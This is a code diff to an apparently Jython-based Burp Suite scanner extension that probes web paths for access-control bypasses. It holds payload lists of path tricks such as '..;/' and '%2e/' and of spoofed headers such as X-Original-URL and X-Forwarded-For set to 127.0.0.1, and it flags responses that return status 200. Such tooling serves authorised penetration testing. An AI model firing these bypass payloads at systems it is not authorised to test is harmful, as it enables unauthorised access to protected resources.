@@ -3,6 +3,7 @@ from burp import IScannerCheck
 from burp import IScanIssue
 from java.io import PrintWriter
 from array import array
+import re
 
 class BurpExtender(IBurpExtender, IScannerCheck):
 
@@ -36,6 +37,10 @@ class BurpExtender(IBurpExtender, IScannerCheck):
             return True
         return False
 
+    def rplHeader(self, headerStr, headerName, newHeader):
+        headerStr = re.sub('^'+headerName+':.*?$', newHeader, headerStr, flags=re.I|re.M)
+        return headerStr
+
     def doPassiveScan(self, baseRequestResponse):
         
         # look for matches of our passive check grep string
@@ -44,20 +49,25 @@ class BurpExtender(IBurpExtender, IScannerCheck):
             return None
         
         OldReq = self._helpers.bytesToString(baseRequestResponse.getRequest())
-        Rurl = self._helpers.analyzeRequest(baseRequestResponse).getUrl().getPath().rstrip("/")
+        Rurl = self._helpers.analyzeRequest(baseRequestResponse).getUrl().getPath()
+        if Rurl != "/":
+            Rurl = self._helpers.analyzeRequest(baseRequestResponse).getUrl().getPath().rstrip("/")
+
         PreviousPath = '/'.join(str(Rurl).split('/')[:-1])
         LastPath = str(Rurl).split('/')[-1]
         self.stdout.println("Scanning: "+Rurl)
+        self.stdout.println(self._helpers.analyzeRequest(baseRequestResponse).getHeaders())
 
 
         payloads = ["%2e/"+LastPath, LastPath+"/.", "./"+LastPath+"/./", LastPath+"%20/", "%20"+LastPath+"%20/", LastPath+"..;/",LastPath+"?",LastPath+"??","/"+LastPath+"//",LastPath+"/",LastPath+"/.randomstring",LastPath+"/.json",LastPath+"/.html",LastPath+"/../../",LastPath+"/../",LastPath+"/../"+LastPath]
-        hpayloads = ["X-Rewrite-URL: /"+LastPath, "X-Custom-IP-Authorization: 127.0.0.1", "X-Original-URL: /"+LastPath,"Referer: /"+LastPath,"X-Originating-IP: 127.0.0.1","X-Forwarded-For: 127.0.0.1","X-Remote-IP: 127.0.0.1","X-Client-IP: 127.0.0.1","X-Host: 127.0.0.1","X-Forwared-Host: 127.0.0.1","X-Forward-Host: 127.0.0.1"]
+        hpayloads = ["X-Rewrite-URL: /"+LastPath, "X-Custom-IP-Authorization: 127.0.0.1", "X-Original-URL: /"+LastPath,"Referer: /"+LastPath,"X-Originating-IP: 127.0.0.1","X-Forwarded-For: 127.0.0.1","X-Remote-IP: 127.0.0.1","X-Client-IP: 127.0.0.1","X-Host: 127.0.0.1","X-Forwared-Host: 127.0.0.1"]
         results = []
+
 
         for p in payloads:
             NewReq = OldReq.replace(Rurl, PreviousPath+"/"+p)
             checkRequestResponse = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), self._helpers.stringToBytes(NewReq))
-
+            # self.stdout.println(self._helpers.analyzeRequest(checkRequestResponse).getUrl().getPath())
             STT_CODE = self._helpers.analyzeResponse(checkRequestResponse.getResponse()).getStatusCode()
             if STT_CODE == 200:
                 results.append("Url payload: "+self._helpers.analyzeRequest(checkRequestResponse).getUrl().getPath() + " | Status code: "+str(STT_CODE))
@@ -65,7 +75,11 @@ class BurpExtender(IBurpExtender, IScannerCheck):
             
 
         for hp in hpayloads:
-            NewReq = OldReq.replace("User-Agent: ", hp+"\r\n"+"User-Agent: ")
+            if hp.startswith("Referer:") and "Referer:" in OldReq:
+                NewReq = self.rplHeader(OldReq, "Referer", hp) #.replace("User-Agent: ", hp+"\r\n"+"User-Agent: ")
+            else:
+                NewReq = OldReq.replace("User-Agent: ", hp+"\r\n"+"User-Agent: ")
+            # self.stdout.println(NewReq)
             checkRequestResponse = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), self._helpers.stringToBytes(NewReq))
             STT_CODE = self._helpers.analyzeResponse(checkRequestResponse.getResponse()).getStatusCode()
             if STT_CODE == 200:
